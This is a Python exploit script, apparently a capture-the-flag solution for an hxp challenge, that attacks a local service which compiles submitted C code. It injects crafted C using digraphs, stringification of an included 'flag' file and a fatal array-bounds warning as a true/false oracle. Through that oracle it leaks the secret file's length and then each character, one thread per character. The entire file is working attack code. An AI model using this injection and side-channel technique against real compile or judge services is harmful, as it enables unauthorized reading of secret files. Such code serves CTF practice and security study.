import base64
import clipboard
import socket
import functools
import string
import threading

class Netcat:
    """ Python 'netcat like' module """

    def __init__(self, ip, port):
        self.buff = b""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((ip, port))

    def read(self, length=1024):
        """ Read 1024 bytes off the socket """

        return self.socket.recv(length)

    def read_until(self, data):
        """ Read data into the buffer until we have data """

        while not data in self.buff:
            self.buff += self.socket.recv(1024)

        pos = self.buff.find(data)
        rval = self.buff[:pos + len(data)]
        self.buff = self.buff[pos + len(data):]

        return rval

    def write(self, data):
        self.socket.send(data)

    def close(self):
        self.socket.close()

def send_payload(code: bytes):
    code = code.replace(b'{', b'<%').replace(b'}', b'%>').replace(b'#', b'%:')
    encoded = base64.b64encode(code)

    netcat = Netcat('127.0.0.1', 8011)
    netcat.read_until(b'>')
    netcat.write(encoded)
    netcat.write(b'\n')

    result = netcat.read_until(b'OK').strip()
    if result == b'OK':
        return True
    if result == b'Not OK':
        return False

    raise RuntimeError(f'WTF? {result}')

@functools.lru_cache(maxsize=1000)
def create_flag_size_test_payload(size):
    exp = """
    int func(void);
    return func();
    }
    #pragma clang diagnostic ignored "-Wchar-subscripts"
    #pragma clang diagnostic ignored "-Wunused-variable"
    #pragma clang diagnostic fatal "-Warray-bounds-pointer-arithmetic"
    int func(void){
        #define test(a) const char test = a[%d];
        #define to_string(a) test(#a)
        #define hxp to_string(
        #include "flag"
        )
        return 0;
    }
    void func2(void) {
    """ % (size)

    return bytes(exp, 'ascii')

@functools.lru_cache(maxsize=1000)
def create_character_test_payload(char_to_test_against, current_flag_index):
    exp = """
    int func(void);
    return func();
    }
    #pragma clang diagnostic ignored "-Wchar-subscripts"
    #pragma clang diagnostic ignored "-Wunused-variable"
    #pragma clang diagnostic fatal "-Warray-bounds-pointer-arithmetic"
    int func(void){
        const char nbz['%s'] = { 0 };
        #define test(a) const char bruter = nbz[a[%s]];
        #define to_string(a) test(#a)
        #define hxp to_string(
        #include "flag"
        )
        return 0;
    }
    void func2(void) {
    """ % (char_to_test_against, current_flag_index)

    return bytes(exp, 'ascii')

def check_if_index_contains_char(index, char):
    print(f'Index = {index}, char = {char}')
    first = send_payload(create_character_test_payload(char, index))
    second = send_payload(create_character_test_payload(chr(ord(char)+1), index))
    return second and not first

def char_test_thread_func(index, flag_chars):
    chars = string.ascii_letters + string.digits + string.punctuation
    for char in chars:
        first = send_payload(create_character_test_payload(char, index))
        second = send_payload(create_character_test_payload(chr(ord(char)+1), index))
        if second and not first:
            print(f'Index = {index}, char = {char}')
            flag_chars[index] = char
            return

    raise Exception("WTF")

def get_flag(flag_size):
    flag_chars = [None] * flag_size
    flag_chars[0] = '{'
    flag_chars[-1] = '}'

    char_threads = []
    for index in range(1, flag_size - 1): #starting from 1 to skip '{' and skipping last char '}'
        print('Starting threads for flag char index {}'.format(index))
        t = threading.Thread(target=char_test_thread_func, args=(index, flag_chars))
        t.start()
        char_threads.append(t)

    print('Waiting for all the flags characters')
    for t in char_threads:
        t.join()

    return 'hxp' + ''.join(flag_chars)

def get_flag_size():
    print('Getting flag size')
    size = 0
    while send_payload(create_flag_size_test_payload(size)):
        size += 1
    return size - 1

def main():
    flag_size = get_flag_size()
    print("Flag size: {}".format(flag_size))
    print(get_flag(flag_size))

if __name__ == '__main__':
    main()
